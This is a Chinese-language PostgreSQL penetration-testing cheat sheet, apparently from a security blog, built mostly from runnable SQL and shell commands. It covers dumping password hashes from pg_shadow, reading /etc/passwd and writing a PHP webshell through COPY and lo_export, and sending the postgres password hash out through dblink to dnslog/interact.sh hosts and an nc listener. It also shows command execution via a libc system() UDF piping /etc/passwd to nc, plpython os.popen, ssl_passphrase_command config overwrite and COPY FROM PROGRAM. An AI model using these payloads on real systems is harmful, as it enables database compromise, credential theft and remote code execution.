
## Postgresql 渗透总结

- - -

Postgresql 数据库作为 python 应用中比较常见的数据库，其利用手段公开的不多,而且利用方式也比较单一，我搜集了国内外一些相关的利用思路进行总结，如有遗漏还请指正。

- - -

# [0x00 信息收集](#toc_0x00)

**查看服务器端版本**

```plain
-- 详细信息
select version();

-- 版本信息
show server_version;
select pg_read_file('PG_VERSION', 0, 200);

-- 数字版本信息包括小版号
SHOW server_version_num;
SELECT current_setting('server_version_num');
```

[![5.png](assets/1698894509-0880292eff7cbe967be3e25b5c82a063.png)](https://storage.tttang.com/media/attachment/2022/04/13/ae6660c5-a19d-4c38-8e9b-a39aa18b6a25.png)

[![6.png](assets/1698894509-ee9930ce0385e1d2316b6d529ab4f640.png)](https://storage.tttang.com/media/attachment/2022/04/13/dcb6ac5d-0ca8-426f-ab30-f4c9c499d289.png)

**列目录**

```plain
-- 注意: 在早期的 PostgreSQL 版本中,pg_ls_dir 不允许使用绝对路径
select pg_ls_dir('/etc');

-- 获取 pgsql 安装目录
select setting from pg_settings where name = 'data_directory';

-- 查找 pgsql 配置文件路径
select setting from pg_settings where name='config_file'
```

[![13.png](assets/1698894509-2fc13e2dd2be30bcc18f973fb83274a4.png)](https://storage.tttang.com/media/attachment/2022/04/13/44983f10-3225-4f31-8262-bd1b1896ca4f.png)

[![30.png](assets/1698894509-3fb3101bdd08a40fa70304d4c2b913ca.png)](https://storage.tttang.com/media/attachment/2022/04/13/99300446-2880-4d3f-bf4f-b0b2a2d2ecf8.png)

**列出数据库**

```plain
SELECT datname FROM pg_database;
```

[![14.png](assets/1698894509-e3c4adbd9b2bf66cc360faf4977a47c5.png)](https://storage.tttang.com/media/attachment/2022/04/13/edb1315b-b852-475e-a194-701bc9b502c3.png)

**查看支持的语言**

```plain
select * from pg_language;
```

[![22.png](assets/1698894509-2a10a0c7219e652c85cfcf5ec1f95eac.png)](https://storage.tttang.com/media/attachment/2022/04/13/befcef4a-00fb-4b42-8db9-fc1a346f3fb6.png)

**查看安装的扩展**

```plain
select * from pg_available_extensions;
```

[![23.png](assets/1698894509-fa0cc37af6dcb0b7aa34241042eb98af.png)](https://storage.tttang.com/media/attachment/2022/04/13/3951952b-cf0f-49f8-8196-37ac491b9c51.png)

**查看服务器ip地址**

```plain
-- 这里是运行在 docker 里的靶机,所以 ip 不一致
select inet_server_addr()
```

[![38.png](assets/1698894509-de45f0bb426d6cf68ac536b469debb1d.png)](https://storage.tttang.com/media/attachment/2022/04/13/bfbb83dc-5744-479a-a497-a843e05ed281.png)

- - -

# [0x01 账号操作](#toc_0x01)

**查看当前用户是不是管理员权限**

```plain
SELECT current_setting('is_superuser');
-- on 代表是, off 代表不是

SHOW is_superuser;
SELECT usesuper FROM pg_user WHERE usename = CURRENT_USER;
```

**查询密码**

```plain
SELECT usename, passwd FROM pg_shadow;
```

[![7.png](assets/1698894509-5bc01dd88933682a23253ef3741c4a5f.png)](https://storage.tttang.com/media/attachment/2022/04/13/c266aeb8-d349-469e-9051-9688abe8ae6a.png)

```plain
SELECT rolname,rolpassword FROM pg_authid;
```

[![19.png](assets/1698894509-79f0749c969f8e0ec3329bc67a3cd5f4.png)](https://storage.tttang.com/media/attachment/2022/04/13/547bb672-cbb5-40b9-9fc5-ca3bb8936148.png)

可以看到,目前查询到的用户 hash 已经是 scram-sha-256,在以前的版本是加盐md5

我们可以查询当前的加密方式

```plain
-- password_encryption参数决定了密码怎么被hash
SELECT name,setting,source,enumvals FROM pg_settings WHERE name = 'password_encryption';
```

[![20.png](assets/1698894509-06a2944028d891770e7b7c41ff81d26e.png)](https://storage.tttang.com/media/attachment/2022/04/13/e216d43c-abf6-479b-9151-db5aad821c48.png)

**添加用户**

```plain
--创建 f0x，赋予角色属性
create user f0x password 'Abcd1234' superuser createrole createdb
--添加 f0x 到角色组
grant postgres to f0x
```

**修改一个角色为管理员角色**

```plain
alter role f0x createrole;
```

**更改密码**

```plain
ALTER USER user_name WITH PASSWORD 'new_password';
```

**查看用户**

```plain
SELECT user;
SELECT current_user;
SELECT session_user;
SELECT usename FROM pg_user;
SELECT getpgusername();
```

**查看管理员用户**

```plain
SELECT usename FROM pg_user WHERE usesuper IS TRUE
```

**获取用户角色**

```plain
SELECT
      r.rolname,
      r.rolsuper,
      r.rolinherit,
      r.rolcreaterole,
      r.rolcreatedb,
      r.rolcanlogin,
      r.rolconnlimit, r.rolvaliduntil,
  ARRAY(SELECT b.rolname
        FROM pg_catalog.pg_auth_members m
        JOIN pg_catalog.pg_roles b ON (m.roleid = b.oid)
        WHERE m.member = r.oid) as memberof
, r.rolreplication
FROM pg_catalog.pg_roles r
ORDER BY 1;
```

[![18.png](assets/1698894509-e658441ffa46e58b4ced3a53920117b1.png)](https://storage.tttang.com/media/attachment/2022/04/13/eac35369-e87e-43a4-a08c-e944ae686455.png)

- - -

# [0x02 PostgreSQL 读文件](#toc_0x02-postgresql)

**方法1 pg\_read\_file**

```plain
-- 注意: 在早期的 PostgreSQL 版本中,pg_read_file 不允许使用绝对路径
select pg_read_file('/etc/passwd');

-- 单引号被转义的情况下使用
select/**/PG_READ_FILE($$/etc/passwd$$)
```

[![15.png](assets/1698894509-a809468e15bb89db4467075cbf17a899.png)](https://storage.tttang.com/media/attachment/2022/04/13/98194b2b-9aa9-4174-9eea-2d6ba11f5192.png)

**方法2**

```plain
create table testf0x(t TEXT);
copy testf0x from '/etc/passwd';
select * from testf0x limit 1 offset 0;
```

[![8.png](assets/1698894509-e386f9278b864c0476e489af0bef9f08.png)](https://storage.tttang.com/media/attachment/2022/04/13/e2e1feb9-8e4e-45ee-b898-ab0fb34edabc.png)

**方法3 lo\_import**

lo\_import 允许指定文件系统路径。该文件将被读取并加载到一个大对象中，并返回该对象的 OID。

```plain
Select lo_import('/etc/passwd',12345678);
select array_agg(b)::text::int from(select encode(data,'hex')b,pageno from pg_largeobject where loid=12345678 order by pageno)a

-- 单引号被转义的情况下使用
select/**/lo_import($$/etc/passwd$$,11111);
select/**/cast(encode(data,$$base64$$)as/**/integer)/**/from/**/pg_largeobject/**/where/**/loid=11111
```

[![9.png](assets/1698894509-4c85a7ff8347715ae08fdbb51be7a862.png)](https://storage.tttang.com/media/attachment/2022/04/13/bf8a1ad0-0207-4e22-bdd6-95ae662d4278.png)

[![10.png](assets/1698894509-67fa327fc6fcc8f7ccaf1e8e13e88a7e.png)](https://storage.tttang.com/media/attachment/2022/04/13/d46455b5-d0ea-493d-bf31-3e438ec5f8da.png)

- - -

# [0x03 PostgreSQL 写文件](#toc_0x03-postgresql)

**利用条件**  
\- 拥有网站路径写入权限  
\- 知道网站绝对路径

**方法1 COPY**

COPY 命令可以用于表和文件之间交换数据，这里可以用它写 webshell

```plain
COPY (select '<?php phpinfo();?>') to '/tmp/1.php';
```

[![1.png](assets/1698894509-dbfdce869c25f81dce8d4ef0edcf6183.png)](https://storage.tttang.com/media/attachment/2022/04/13/b334d46d-5637-4f75-a8eb-46e17927eed3.png)

[![2.png](assets/1698894509-02f7423824fe968a5aa06ac6a0848283.png)](https://storage.tttang.com/media/attachment/2022/04/13/43fc1eea-b852-4064-9b72-e4f4705930a5.png)

也可以 base64 一下

```plain
COPY (select convert_from(decode('ZmZmZmZmZmYweA==','base64'),'utf-8')) to '/tmp/success.txt';
```

[![16.png](assets/1698894509-872ce1df343e9c012f72279459e577c6.png)](https://storage.tttang.com/media/attachment/2022/04/13/e1a02b02-c74b-4285-91cf-d35609a6d693.png)

[![17.png](assets/1698894509-9abf9f095318d56c6ed8f4a6606339d5.png)](https://storage.tttang.com/media/attachment/2022/04/13/1d842209-317e-4184-9770-5eb30dd4910c.png)

**方法2 lo\_export**

lo\_export 采用大对象 OID 和路径，将文件写入路径。

```plain
select lo_from_bytea(12349,'ffffffff0x');
SELECT lo_export(12349, '/tmp/ffffffff0x.txt');

-- base64 的形式
select lo_from_bytea(12350,decode('ZmZmZmZmZmYweA==','base64'));
SELECT lo_export(12350, '/tmp/ffffffff0x.txt');
```

[![36.png](assets/1698894509-63ebed23692eb46730a9202926fedb0c.png)](https://storage.tttang.com/media/attachment/2022/04/13/b344ef39-3135-408b-93bc-e4ff84ead051.png)

[![37.png](assets/1698894509-8de8c60c3ef13bb751696613564bb2ff.png)](https://storage.tttang.com/media/attachment/2022/04/13/85879882-5bf4-4831-9118-c8ac48b53a41.png)

**方法3 lo\_export + pg\_largeobject**

```plain
-- 记下生成的lo_creat ID
select lo_creat(-1);

-- 替换 24577 为生成的lo_creat ID
INSERT INTO pg_largeobject(loid, pageno, data) values (24577, 0, decode('ZmZmZmZmZmYweA==', 'base64'));
select lo_export(24577, '/tmp/success.txt');
```

[![31.png](assets/1698894509-ebbfd18beec509924a42452b8ecf0c75.png)](https://storage.tttang.com/media/attachment/2022/04/13/ecc3445e-401e-4563-bbf6-1b1ef06b80ac.png)

[![32.png](assets/1698894509-b1ae676e849bc88ae2a8f8de9f38cd47.png)](https://storage.tttang.com/media/attachment/2022/04/13/df3349c8-894a-4fba-bf73-8239ba2a3be9.png)

[![33.png](assets/1698894509-857a51557ca79949cc0e3086a66bcb49.png)](https://storage.tttang.com/media/attachment/2022/04/13/f045198b-d48a-4f72-bc40-503c516806ff.png)

如果内容过多，那么首先创建一个 OID 作为写入的对象, 然后通过 0,1,2,3… 分片上传但是对象都为 12345 最后导出到 /tmp 目录下, 收尾删除 OID

写的文件每一页不能超过 2KB，所以我们要把数据分段，这里我就不拿 .so 文件为例了,就随便写个 txt 举个例子

```plain
SELECT lo_create(12345);
INSERT INTO pg_largeobject VALUES (12345, 0, decode('6666', 'hex'));
INSERT INTO pg_largeobject VALUES (12345, 1, decode('666666', 'hex'));
INSERT INTO pg_largeobject VALUES (12345, 2, decode('6666', 'hex'));
INSERT INTO pg_largeobject VALUES (12345, 3, decode('663078', 'hex'));
SELECT lo_export(12345, '/tmp/ffffffff0x.txt');
SELECT lo_unlink(12345);
```

[![11.png](assets/1698894509-08aade033ef9b93db77c346d07d9e584.png)](https://storage.tttang.com/media/attachment/2022/04/13/25826641-84cc-4537-a06a-944dea8f950c.png)

[![12.png](assets/1698894509-c9713247525ac24470f9b7064003ea13.png)](https://storage.tttang.com/media/attachment/2022/04/13/6295fd8e-d572-4083-808d-ec0693888c88.png)

或者还可以用 lo\_put 在后面拼接进行写入

```plain
select lo_create(11116);
select lo_put(11116,0,'dGVzdDEyM');
select lo_put(11116,9,'zQ1Ng==');

select lo_from_bytea(11141,decode(encode(lo_get(11116),'escape'),'base64'));
select lo_export(11141,'/tmp/test.txt');
SELECT lo_unlink(11141);
```

[![45.png](assets/1698894509-e2a2361968aaf240fb106596efac1fb5.png)](https://storage.tttang.com/media/attachment/2022/04/13/00fd0234-2cb4-400d-8f38-7164b925aa0a.png)

[![46.png](assets/1698894509-5d77269fd73941497e48ecbad76b764e.png)](https://storage.tttang.com/media/attachment/2022/04/13/5e0631a1-8fd2-4ded-ab72-c6564137549f.png)

[![47.png](assets/1698894509-eee0b6c2bbdf9a1a1534726a912d7c2b.png)](https://storage.tttang.com/media/attachment/2022/04/13/44cd03f7-f062-464c-ac56-bd555758e83b.png)

结束记得清理 OID 内容

```plain
-- 查看创建的 lo_creat ID
select * from pg_largeobject

-- 使用 lo_unlink 进行删除
SELECT lo_unlink(12345);
```

- - -

# [0x04 PostgreSQL 创建文件夹](#toc_0x04-postgresql)

## [通过 log\_directory 创建文件夹](#toc_log_directory)

方法来自于 [https://www.yulegeyu.com/2020/11/16/Postgresql-Superuser-SQL%E6%B3%A8%E5%85%A5-RCE%E4%B9%8B%E6%97%85/](https://www.yulegeyu.com/2020/11/16/Postgresql-Superuser-SQL%E6%B3%A8%E5%85%A5-RCE%E4%B9%8B%E6%97%85/) 这篇文章的场景

**利用条件**  
\- 目标已经配置了 `logging_collector = on`

**描述**

配置文件中的 log\_directory 配置的目录不存在时，pgsql 启动会失败，但是如果日志服务已启动,在修改 log\_directory 配置后再 reload\_conf 目录会被创建

**原理**

logging\_collector 配置是否开启日志，只能在服务开启时配置，reloadconf 无法修改,log\_directory 用来配置 log 日志文件存储到哪个目录，如果 log\_directory 配置到一个不存在的目录,pgsql 会创建目录。

**测试**

拿靶机中的 postgresql 为例，先查看配置文件的路径

```plain
select setting from pg_settings where name='config_file'
```

[![39.png](assets/1698894509-10dc82fdb45d3973e4cc6c841838898e.png)](https://storage.tttang.com/media/attachment/2022/04/13/afbbc57e-bc8d-4403-985d-cb10bc413bde.png)

查看内容

```plain
select pg_read_file('/var/lib/postgresql/data/postgresql.conf');
```

将配置文件中的 log\_directory 配置修改

```plain
log_destination = 'csvlog'
log_directory = '/tmp/f0x'
log_filename = 'postgresql-%Y-%m-%d_%H%M%S.log'
log_rotation_size = 100MB
log_rotation_age = 1d
log_min_messages = INFO
logging_collector = on
```

转为 base64 格式

```plain
# 这里我将配置文件的内容存到了 out.txt 中
cat out.txt | base64 -w 0 > base64.txt
```

```plain
-- 将修改后的配置文件加载到largeobject中
select lo_from_bytea(10001,decode('base64的内容,这里略','base64'));

-- 通过lo_export覆盖配置文件
select lo_export(10001,'/var/lib/postgresql/data/postgresql.conf');
SELECT lo_unlink(10001);

-- 重新加载配置文件
select pg_reload_conf();
```

[![40.png](assets/1698894509-7fc89a755370cfa49e0ba6421f91e5eb.png)](https://storage.tttang.com/media/attachment/2022/04/13/095b0408-07ac-4273-96e4-088c46748e01.png)

[![41.png](assets/1698894509-350710cfc75d982c7fa69a4c6ffdf2bd.png)](https://storage.tttang.com/media/attachment/2022/04/13/776fdc1e-f96f-41fe-b829-bcb26a8ec4aa.png)

[![42.png](assets/1698894509-be8d0a7e1bce531d8ae374ab1054786f.png)](https://storage.tttang.com/media/attachment/2022/04/13/562b25c3-37ac-488b-b1b6-d2d2bf0e1c77.png)

```plain
-- 查询一下修改是否成功
select name,setting,short_desc from pg_settings where name like 'log_%';
```

[![43.png](assets/1698894509-8ffe0d34dc01537bcf5e7375063339f2.png)](https://storage.tttang.com/media/attachment/2022/04/13/6ded6764-817f-4329-8520-1391cf3409a1.png)

进入靶机,可以看到 f0x 目录已经创建

[![44.png](assets/1698894509-eda26ece15068bdb545fa1b7a3753fb1.png)](https://storage.tttang.com/media/attachment/2022/04/13/d280aa46-f82c-415a-8fd6-c1a52e924977.png)

- - -

# [0x05 PostgreSQL 带外数据](#toc_0x05-postgresql)

```plain
-- 开启 dblink 扩展
CREATE EXTENSION dblink

-- 获取当前数据库用户名称
SELECT * FROM dblink('host='||(select user)||'.djw0pg.dnslog.cn user=test dbname=test', 'SELECT version()') RETURNS (result TEXT);
```

[![21.png](assets/1698894509-85361254bc80e3de3fe0d922f6114dfb.png)](https://storage.tttang.com/media/attachment/2022/04/13/b147c57d-849d-43a3-8b1f-7f8842a98c2a.png)

```plain
-- 查询当前密码
SELECT * FROM dblink('host='||(SELECT passwd FROM pg_shadow WHERE usename='postgres')||'.c8jrsjp2vtc0000rwce0grjcc3oyyyyyb.interact.sh user=test dbname=test', 'SELECT version()') RETURNS (result TEXT);
```

[![34.png](assets/1698894509-5db0a601435aa8ec67ac72ba958ce5d0.png)](https://storage.tttang.com/media/attachment/2022/04/13/33b8e5bd-6bd9-4cac-8303-fb0e6c1cc4b2.png)

```plain
-- nc 监听
nc -lvv 4444

select dblink_connect((select 'hostaddr=x.x.x.x port=4445 user=test password=test sslmode=disable dbname='||(SELECT passwd FROM pg_shadow WHERE usename='postgres')));
```

[![35.png](assets/1698894509-06be7b5f2c368485a77b29d57f28a239.png)](https://storage.tttang.com/media/attachment/2022/04/13/0209275e-091e-4aa7-927b-58e2c9141826.png)

- - -

# [0x06 PostgreSQL 提权](#toc_0x06-postgresql)

## [利用 UDF 命令执行](#toc_udf)

在 8.2 以前,postgresql 不验证 magic block,可以直接调用本地的 libc.so

```plain
CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;
SELECT system('cat /etc/passwd | nc xxx.xx.xx.xx');
```

8.2 以上版本,需要自己编译 so 文件去创建执行命令函数，可以自己编译反弹 shell 后门，也可以用 sqlmap 提供好的  
\- [https://github.com/sqlmapproject/sqlmap/tree/master/data/udf/postgresql](https://github.com/sqlmapproject/sqlmap/tree/master/data/udf/postgresql)

可以参考 [No-Github/postgresql\_udf\_help](https://github.com/No-Github/postgresql_udf_help)

```plain
# 找相应的 dev 扩展包
apt-get search postgresql-server-dev
# 安装 dev 扩展包
apt-get install postgresql-server-dev-11
# apt install postgresql-server-dev-all

# 编译好 .so 文件
git clone https://github.com/No-Github/postgresql_udf_help
cd postgresql_udf_help
gcc -Wall -I/usr/include/postgresql/11/server -Os -shared lib_postgresqludf_sys.c -fPIC -o lib_postgresqludf_sys.so
strip -sx lib_postgresqludf_sys.so

# 生成分片后的 sql 语句
cat lib_postgresqludf_sys.so | xxd -ps | tr -d "\n" > 1.txt
python2 postgresql_udf_help.py 1.txt > sqlcmd.txt
```

[![4.png](assets/1698894509-fcc43973d815e63643341c9e3475b872.png)](https://storage.tttang.com/media/attachment/2022/04/13/41b6682f-0562-4212-b241-54000ddae2d8.png)

## [PL/Python 扩展](#toc_plpython)

PostgreSQL 可以支持多种存储过程语言，官方支持的除了 PL/pgSQL，还有 TCL，Perl，Python 等。

默认 PostgreSQL 不会安装 Python 的扩展,这里我手动在靶机上安装下进行复现

```plain
select version();
```

先看下版本, pg 14

[![24.png](assets/1698894509-c6ce9395839d5946676f919f00e5f8fe.png)](https://storage.tttang.com/media/attachment/2022/04/13/e5928af7-5664-45d6-996a-d2ec373db5a5.png)

搜索下有没有对应的 plpython3u 版本安装

```plain
apt search postgresql-plpython
```

[![25.png](assets/1698894509-86171a3be096e2f9e31db653fc97a8c3.png)](https://storage.tttang.com/media/attachment/2022/04/13/6e8e78c2-7a1d-44a4-9c30-46588460828b.png)

有,那么直接装

```plain
apt install postgresql-plpython-14
```

安装完毕后记得注册下扩展

```plain
create extension plpython3u;
```

[![26.png](assets/1698894509-ad3f4d37521404ac66782af34f74d97f.png)](https://storage.tttang.com/media/attachment/2022/04/13/4e6114db-7100-42da-ae93-c7c620374672.png)

查看是否支持 plpython3u

```plain
select * from pg_language;
```

[![27.png](assets/1698894509-b8a7c75fb3164ae89b2fac5b6941d068.png)](https://storage.tttang.com/media/attachment/2022/04/13/f6ccc1d0-e78d-4342-9305-c86b7f91134a.png)

创建一个 UDF 来执行我们要执行的命令

```plain
CREATE FUNCTION system (a text)
  RETURNS text
AS $$
  import os
  return os.popen(a).read()
$$ LANGUAGE plpython3u;
```

[![28.png](assets/1698894509-06c6083e9e71dd831af023851481d178.png)](https://storage.tttang.com/media/attachment/2022/04/13/db66b4fc-6f8b-4e6e-bea0-6c12526ba6d2.png)

创建好 UDF 后，进行调用

```plain
select system('ls -la');
```

[![29.png](assets/1698894509-41052cedc4779bf76cde0848a55b31a2.png)](https://storage.tttang.com/media/attachment/2022/04/13/8545679f-aad2-402c-96da-ca584464564a.png)

## [利用 session\_preload\_libraries 加载共享库](#toc_session_preload_libraries)

方法来自于 [https://www.yulegeyu.com/2020/11/16/Postgresql-Superuser-SQL%E6%B3%A8%E5%85%A5-RCE%E4%B9%8B%E6%97%85/](https://www.yulegeyu.com/2020/11/16/Postgresql-Superuser-SQL%E6%B3%A8%E5%85%A5-RCE%E4%B9%8B%E6%97%85/) 这篇文章的场景

**描述**

session\_preload\_libraries 只允许 superuser 修改，但可以加载任意目录的库，session\_preload\_libraries 配置从 pg10 开始存在，低于 pg10 时，可以使用 local\_preload\_libraries，不过该配置只允许加载 $libdir/plugins/ 目录下的库，需要将库写入到该目录下。

当每次有新连接进来时，都会加载 session\_preload\_libraries 配置的共享库。

和上面的利用 UDF 命令执行一样，不过不同点在于上面一个是创建 function 加载,这个方式是通过改配置文件中的 session\_preload\_libraries 进行加载，这里就不复现了

## [利用 ssl\_passphrase\_command 执行命令](#toc_ssl_passphrase_command)

方法来自于 [https://pulsesecurity.co.nz/articles/postgres-sqli](https://pulsesecurity.co.nz/articles/postgres-sqli) 这篇文章的场景

**利用条件**  
\- 需要知道 PG\_VERSION 文件的位置 (不是 PG\_VERSION 文件也行,pgsql限制私钥文件权限必须是0600才能够加载，pgsql目录下的所有0600权限的文件都是可以的,但覆盖后没啥影响的就 PG\_VERSION 了)

**描述**

当配置文件中配置了 ssl\_passphrase\_command ，那么该配置在需要获取用于解密SSL文件密码时会调用该配置的命令。

通过上传 pem，key 到目标服务器上，读取配置文件内容，修改配置文件中的ssl配置改为我们要执行的命令，通过lo\_export覆盖配置文件，最后通过 pg\_reload\_conf 重载配置文件时将执行命令

**复现**

这里以靶机上已经存在的2个密钥文件为例

```plain
/etc/ssl/certs/ssl-cert-snakeoil.pem
/etc/ssl/private/ssl-cert-snakeoil.key
```

通过文件读取获取私钥

```plain
select pg_read_file('/etc/ssl/private/ssl-cert-snakeoil.key');
```

对私钥文件加密

```plain
# 密码为 12345678
openssl rsa -aes256 -in ssl-cert-snakeoil.key -out private_passphrase.key

# 输出为 base64 格式
cat private_passphrase.key | base64 -w 0 > base.txt
```

上传 private\_passphrase.key 到目标服务器上

由于 pgsql 限制私钥文件权限必须是 0600 才能够加载，这里搜索 pgsql 目录下的所有 0600 权限的文件,发现 PG\_VERSION 文件符合条件，而且覆盖也没有太大影响

PG\_VERSION 与 config\_file 文件同目录，上传私钥文件覆盖 PG\_VERSION，可绕过权限问题。

```plain
-- 将 private_passphrase.key 覆盖 PG_VERSION 文件
select lo_from_bytea(10004,decode('base64的内容,这里略','base64'));
select lo_export(10004,'/var/lib/postgresql/data/PG_VERSION');
SELECT lo_unlink(10004);
```

在靶机中查看验证是否写入成功

[![49.png](assets/1698894509-aedf6fc1615ecdfc746d4e5ad8f6731e.png)](https://storage.tttang.com/media/attachment/2022/04/13/a604d4f8-d1d5-470d-8ee2-b663c09a36b1.png)

读取配置文件内容

```plain
select setting from pg_settings where name='config_file'
select pg_read_file('/var/lib/postgresql/data/postgresql.conf');
```

在原始配置文件内容末尾追加上ssl配置

```plain
ssl = on
ssl_cert_file = '/etc/ssl/certs/ssl-cert-snakeoil.pem'
ssl_key_file = '/var/lib/postgresql/data/PG_VERSION'
ssl_passphrase_command_supports_reload = on
ssl_passphrase_command = 'bash -c "touch /tmp/success & echo 12345678; exit 0"'
```

转为 base64 格式

```plain
# 这里我将配置文件的内容存到了 out.txt 中
cat out.txt | base64 -w 0 > base3.txt
```

```plain
-- 将修改后的配置文件加载到largeobject中
select lo_from_bytea(10001,decode('base64的内容,这里略','base64'));

-- 通过lo_export覆盖配置文件
select lo_export(10001,'/var/lib/postgresql/data/postgresql.conf');
SELECT lo_unlink(10001);

-- 重新加载配置文件
select pg_reload_conf();
```

[![50.png](assets/1698894509-896d953efee02a5aa1b279588875d2ff.png)](https://storage.tttang.com/media/attachment/2022/04/13/46a25dbd-88cb-44fe-8ff9-bb38eca91da0.png)

可以看到,重新加载配置文件后,ssl\_passphrase\_command 中的命令已经执行

[![48.png](assets/1698894509-22e2930fc0b2f398cd000e2a9e98056f.png)](https://storage.tttang.com/media/attachment/2022/04/13/9890698f-2d9a-430d-a776-3106b2e6b225.png)

## [CVE-2018-1058 PostgreSQL 提权漏洞](#toc_cve-2018-1058-postgresql)

PostgreSQL 其 9.3 到 10 版本中存在一个逻辑错误，导致超级用户在不知情的情况下触发普通用户创建的恶意代码，导致执行一些不可预期的操作。

详细复现可以参考 vulhub 靶场中的 writeup  
\- [https://vulhub.org/#/environments/postgres/CVE-2018-1058/](https://vulhub.org/#/environments/postgres/CVE-2018-1058/)

## [CVE-2019-9193 PostgreSQL 高权限命令执行漏洞](#toc_cve-2019-9193-postgresql)

**描述**

PostgreSQL 其 9.3 到 11 版本中存在一处“特性”，管理员或具有“COPY TO/FROM PROGRAM”权限的用户，可以使用这个特性执行任意命令。

**利用条件**  
\- 版本9.3-11.2  
\- 超级用户或者pg\_read\_server\_files组中的任何用户

**相关文章**  
\- [Authenticated Arbitrary Command Execution on PostgreSQL 9.3 > Latest](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5)

**POC | Payload | exp**

```plain
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
```

[![3.png](assets/1698894509-febf9cfd97fa237dda385eebb1f1fbcc.png)](https://storage.tttang.com/media/attachment/2022/04/13/afe50a76-1cae-4e11-b5c0-3f1058fd175e.png)

- - -

# [0x07 参考](#toc_0x07)

-   [https://jianfensec.com/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%B8%97%E9%80%8F%E4%B8%AD%E5%88%A9%E7%94%A8postgresql%20getshell/](https://jianfensec.com/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%B8%97%E9%80%8F%E4%B8%AD%E5%88%A9%E7%94%A8postgresql%20getshell/)
-   [https://github.com/safe6Sec/PentestDB/blob/master/PostgreSQL.md](https://github.com/safe6Sec/PentestDB/blob/master/PostgreSQL.md)
-   [https://github.com/nixawk/pentest-wiki/blob/master/2.Vulnerability-Assessment/Database-Assessment/postgresql/postgresql\_hacking.md](https://github.com/nixawk/pentest-wiki/blob/master/2.Vulnerability-Assessment/Database-Assessment/postgresql/postgresql_hacking.md)
-   [https://hakin9.org/a-penetration-testers-guide-to-postgresql/](https://hakin9.org/a-penetration-testers-guide-to-postgresql/)
-   [https://tttang.com/archive/854/](https://tttang.com/archive/854/)
-   [https://valleylord.github.io/post/201410-postgres-plpython-install/](https://valleylord.github.io/post/201410-postgres-plpython-install/)
-   [https://www.unix-ninja.com/p/postgresql\_for\_red\_teams](https://www.unix-ninja.com/p/postgresql_for_red_teams)
-   [https://pulsesecurity.co.nz/articles/postgres-sqli](https://pulsesecurity.co.nz/articles/postgres-sqli)
-   [https://book.hacktricks.xyz/pentesting/pentesting-postgresql](https://book.hacktricks.xyz/pentesting/pentesting-postgresql)
-   [https://github.com/nixawk/pentest-wiki/blob/master/2.Vulnerability-Assessment/Database-Assessment/postgresql/postgresql\_hacking.md](https://github.com/nixawk/pentest-wiki/blob/master/2.Vulnerability-Assessment/Database-Assessment/postgresql/postgresql_hacking.md)
-   [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md)
-   [https://www.freebuf.com/articles/database/270106.html](https://www.freebuf.com/articles/database/270106.html)
-   [https://mp.weixin.qq.com/s/I5hDjIEzn0rKA9aCZsJw9w](https://mp.weixin.qq.com/s/I5hDjIEzn0rKA9aCZsJw9w)
-   [https://xz.aliyun.com/t/10202](https://xz.aliyun.com/t/10202)
-   [https://www.yulegeyu.com/2020/11/16/Postgresql-Superuser-SQL%E6%B3%A8%E5%85%A5-RCE%E4%B9%8B%E6%97%85/](https://www.yulegeyu.com/2020/11/16/Postgresql-Superuser-SQL%E6%B3%A8%E5%85%A5-RCE%E4%B9%8B%E6%97%85/)
